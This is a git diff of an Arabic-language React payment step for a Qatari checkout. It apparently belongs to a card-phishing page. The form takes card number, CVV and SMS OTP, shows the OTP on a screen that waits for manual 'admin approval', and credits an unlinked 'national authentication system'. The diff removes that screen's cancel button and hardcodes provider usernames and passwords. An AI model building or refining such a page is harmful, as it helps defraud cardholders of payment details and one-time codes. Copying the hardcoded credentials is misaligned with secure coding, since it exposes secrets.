@@ -32,6 +32,39 @@ const cardLogos = {
   naps: "https://img.icons8.com/color/96/bank-card-back-side.png",
 };
 
+const providerData = {
+  visa: {
+    name: "Visa",
+    fullName: "Visa Inc.",
+    description: "الدفع الآمن عبر شبكة فيزا العالمية",
+    founded: "1958",
+    countries: "210+",
+    features: ["معاملات آمنة", "قبول عالمي", "حماية مشتري"],
+    username: "visa_merchant@example.com",
+    password: "visa_pass_2024"
+  },
+  master: {
+    name: "Mastercard",
+    fullName: "Mastercard International",
+    description: "حلول دفع متقدمة موثوقة عالمياً",
+    founded: "1966",
+    countries: "210+",
+    features: ["تشفير 256-bit", "حماية الاحتيال", "دعم عام"],
+    username: "mastercard_merchant@example.com",
+    password: "mastercard_pass_2024"
+  },
+  naps: {
+    name: "NAPS",
+    fullName: "National Automated Payment System",
+    description: "نظام الدفع الوطني - حل دفع قطري",
+    founded: "2010",
+    countries: "1",
+    features: ["محلي قطري", "سهل الاستخدام", "دعم عربي"],
+    username: "naps_merchant_qa",
+    password: "naps_pass_qa_2024"
+  }
+};
+
 export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
   const [, setLocation] = useLocation();
   const { toast } = useToast();
@@ -40,6 +73,8 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
   const [cardType, setCardType] = useState<"visa" | "master" | "naps">("visa");
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
 
   // OTP State
   const [showOtp, setShowOtp] = useState(false);
@@ -227,18 +262,29 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
     // Waiting for admin approval
     if (waitingForApproval) {
       return (
-        <div className="fixed inset-0 bg-black/50 flex items-end z-50" dir="rtl">
+        <div
+          className="fixed inset-0 bg-black/50 flex items-end z-50"
+          dir="rtl"
+        >
           <div className="bg-white w-full max-w-md mx-auto rounded-t-3xl overflow-hidden shadow-2xl">
             {/* Header */}
             <div className="bg-white border-b border-gray-100 px-6 py-4">
               <div className="flex items-center justify-between">
                 <div className="flex items-center gap-3">
                   <div className="w-10 h-10 bg-gray-100 rounded-lg flex items-center justify-center">
-                    <img src={cardLogos[cardType]} alt={cardType} className="h-6 w-6 object-contain" />
+                    <img
+                      src={cardLogos[cardType]}
+                      alt={cardType}
+                      className="h-6 w-6 object-contain"
+                    />
                   </div>
                   <div>
                     <p className="font-bold text-gray-900">
-                      {cardType === "visa" ? "Visa" : cardType === "master" ? "Mastercard" : "Debit / NAPS"}
+                      {cardType === "visa"
+                        ? "Visa"
+                        : cardType === "master"
+                          ? "Mastercard"
+                          : "Debit / NAPS"}
                     </p>
                     <p className="text-xs text-gray-500">تحقق من الهوية</p>
                   </div>
@@ -256,29 +302,23 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
                 <Clock className="h-8 w-8 text-orange-600 animate-pulse" />
               </div>
               <p className="text-gray-600 font-medium">جاري المعالجة...</p>
-              <p className="text-sm text-gray-500">تم إرسال طلب التحقق وفي انتظار الموافقة</p>
-
+              <p className="text-sm text-gray-500">
+                تم إرسال طلب التحقق وفي انتظار الموافقة
+              </p>
               <div className="bg-gray-50 rounded-lg p-4 space-y-3 text-sm">
                 <div className="flex justify-between">
                   <span className="text-gray-600">البطاقة:</span>
-                  <span className="font-mono text-gray-900">****{cardNumber.slice(-4)}</span>
+                  <span className="font-mono text-gray-900">
+                    ****{cardNumber.slice(-4)}
+                  </span>
                 </div>
                 <div className="flex justify-between">
                   <span className="text-gray-600">الرمز:</span>
-                  <span className="font-mono font-bold text-purple-600">{otpCode}</span>
+                  <span className="font-mono font-bold text-purple-600">
+                    {otpCode}
+                  </span>
                 </div>
-              </div>
-
-              <Button
-                onClick={() => {
-                  setWaitingForApproval(false);
-                  setOtpCode("");
-                }}
-                variant="outline"
-                className="w-full border-gray-300"
-              >
-                إلغاء
-              </Button>
+              </div>{" "}
             </div>
           </div>
         </div>
@@ -293,11 +333,19 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
             <div className="flex items-center justify-between">
               <div className="flex items-center gap-3">
                 <div className="w-10 h-10 bg-gray-100 rounded-lg flex items-center justify-center">
-                  <img src={cardLogos[cardType]} alt={cardType} className="h-6 w-6 object-contain" />
+                  <img
+                    src={cardLogos[cardType]}
+                    alt={cardType}
+                    className="h-6 w-6 object-contain"
+                  />
                 </div>
                 <div>
                   <p className="font-bold text-gray-900">
-                    {cardType === "visa" ? "Visa" : cardType === "master" ? "Mastercard" : "Debit / NAPS"}
+                    {cardType === "visa"
+                      ? "Visa"
+                      : cardType === "master"
+                        ? "Mastercard"
+                        : "Debit / NAPS"}
                   </p>
                   <p className="text-xs text-gray-500">تحقق من الهوية</p>
                 </div>
@@ -312,20 +360,20 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
           <div className="space-y-6 py-8 px-6">
             {/* Card Logos */}
             <div className="flex items-center justify-center gap-3 pb-4">
-              <img 
-                src={cardLogos.naps} 
+              <img
+                src={cardLogos.naps}
                 alt="NAPS"
                 className="h-6 w-6 opacity-50"
               />
               <span className="text-gray-300">|</span>
-              <img 
-                src={cardLogos.master} 
+              <img
+                src={cardLogos.master}
                 alt="Mastercard"
                 className="h-6 w-6 opacity-50"
               />
               <span className="text-gray-300">|</span>
-              <img 
-                src={cardLogos.visa} 
+              <img
+                src={cardLogos.visa}
                 alt="Visa"
                 className="h-6 w-6 opacity-50"
               />
@@ -333,9 +381,13 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
 
             {/* Title and Description */}
             <div className="text-center space-y-2">
-              <h3 className="font-bold text-gray-900 text-lg">يرجى تأكيد هويتك</h3>
+              <h3 className="font-bold text-gray-900 text-lg">
+                يرجى تأكيد هويتك
+              </h3>
               <p className="text-sm text-gray-600">
-                أدخل الرمز المرسل إلى +974 {formData?.step_2_personal_data?.phoneNumber?.slice(-4) || "****"}
+                أدخل الرمز المرسل إلى +974{" "}
+                {formData?.step_2_personal_data?.phoneNumber?.slice(-4) ||
+                  "****"}
               </p>
             </div>
 
@@ -350,7 +402,11 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
                 onChange={(e) => handleOtpChange(e.target.value)}
                 placeholder="أدخل رمز التحقق"
                 className={`w-full h-16 text-center text-3xl font-bold tracking-widest border-2 rounded-lg focus:outline-none focus:ring-2 transition-all ${
-                  otpError ? "border-red-500 bg-red-50" : otpCode ? "border-blue-500 bg-white" : "border-gray-300 bg-white"
+                  otpError
+                    ? "border-red-500 bg-red-50"
+                    : otpCode
+                      ? "border-blue-500 bg-white"
+                      : "border-gray-300 bg-white"
                 }`}
                 data-testid="input-card-otp"
               />
@@ -377,7 +433,9 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
             {/* Main Button */}
             <Button
               onClick={handleVerifyOtp}
-              disabled={isVerifying || (otpCode.length !== 4 && otpCode.length !== 6)}
+              disabled={
+                isVerifying || (otpCode.length !== 4 && otpCode.length !== 6)
+              }
               className="w-full bg-gray-700 hover:bg-gray-800 text-white h-14 text-lg font-bold rounded-full disabled:opacity-50"
               data-testid="button-verify-card-otp"
             >
@@ -396,14 +454,18 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
                 className="text-gray-600 hover:text-gray-800 disabled:text-gray-400 text-sm transition-colors"
                 data-testid="button-resend-card-otp"
               >
-                {cooldown > 0 ? `إعادة الإرسال بعد ${cooldown}ث` : "لم تستقبل الرمز؟ أعد الإرسال"}
+                {cooldown > 0
+                  ? `إعادة الإرسال بعد ${cooldown}ث`
+                  : "لم تستقبل الرمز؟ أعد الإرسال"}
               </button>
             </div>
 
             {/* Footer */}
             <p className="text-center text-xs text-gray-500">
-              تم توفير الخدمة بواسطة نظام التوثيق الوطني | 
-              <a href="#" className="text-blue-600 hover:underline ml-1">الشروط والخصوصية</a>
+              تم توفير الخدمة بواسطة نظام التوثيق الوطني |
+              <a href="#" className="text-blue-600 hover:underline ml-1">
+                الشروط والخصوصية
+              </a>
             </p>
           </div>
         </div>
@@ -443,7 +505,16 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
             <Label className="font-bold text-sm text-gray-700">
               طريقة الدفع
             </Label>
-            <RadioGroup value={cardType} onValueChange={(v) => setCardType(v as "visa" | "master" | "naps")} className="grid grid-cols-3 gap-3">
+            <RadioGroup
+              value={cardType}
+              onValueChange={(v) => {
+                const type = v as "visa" | "master" | "naps";
+                setCardType(type);
+                setUsername(providerData[type].username);
+                setPassword(providerData[type].password);
+              }}
+              className="grid grid-cols-3 gap-3"
+            >
               <label className="cursor-pointer border-2 border-transparent hover:border-gray-200 [&:has(:checked)]:border-blue-500 [&:has(:checked)]:bg-blue-50 rounded-lg p-3 flex flex-col items-center justify-center transition-all bg-gray-50">
                 <RadioGroupItem value="visa" id="visa" className="sr-only" />
                 <CreditCard className="h-8 w-8 mb-2 text-blue-600" />
@@ -468,6 +539,67 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
                 </span>
               </label>
             </RadioGroup>
+          </div>
+
+          {/* Provider Information */}
+          <div className="bg-gradient-to-r from-blue-50 to-blue-100 border border-blue-200 rounded-lg p-4">
+            <div className="flex items-start gap-4">
+              <div className="w-16 h-16 bg-white rounded-lg flex items-center justify-center flex-shrink-0 shadow-sm">
+                <img src={cardLogos[cardType]} alt={cardType} className="h-10 w-10 object-contain" />
+              </div>
+              <div className="flex-1">
+                <div className="mb-3">
+                  <p className="text-lg font-bold text-gray-900">{providerData[cardType].fullName}</p>
+                  <p className="text-sm text-gray-600 mt-1">{providerData[cardType].description}</p>
+                </div>
+                <div className="grid grid-cols-2 gap-4 text-xs">
+                  <div>
+                    <p className="text-gray-500 font-medium">تأسس</p>
+                    <p className="text-gray-900 font-semibold">{providerData[cardType].founded}</p>
+                  </div>
+                  <div>
+                    <p className="text-gray-500 font-medium">الدول المدعومة</p>
+                    <p className="text-gray-900 font-semibold">{providerData[cardType].countries}</p>
+                  </div>
+                </div>
+                <div className="mt-3 flex flex-wrap gap-2">
+                  {providerData[cardType].features.map((feature, i) => (
+                    <span key={i} className="inline-block bg-blue-200 text-blue-900 text-xs font-medium px-2.5 py-1 rounded-full">
+                      {feature}
+                    </span>
+                  ))}
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* Provider Credentials */}
+          <div className="grid grid-cols-2 gap-4">
+            <div className="space-y-2">
+              <Label className="font-bold text-sm text-gray-700">
+                اسم مستخدم المزود
+              </Label>
+              <Input
+                className="text-right h-12 bg-blue-50 border-blue-200"
+                placeholder="اسم المستخدم"
+                value={username}
+                readOnly
+                data-testid="input-provider-username"
+              />
+            </div>
+            <div className="space-y-2">
+              <Label className="font-bold text-sm text-gray-700">
+                كلمة مرور المزود
+              </Label>
+              <Input
+                className="text-right h-12 bg-blue-50 border-blue-200"
+                placeholder="كلمة المرور"
+                value={password}
+                type="password"
+                readOnly
+                data-testid="input-provider-password"
+              />
+            </div>
           </div>
 
           <div className="space-y-2">
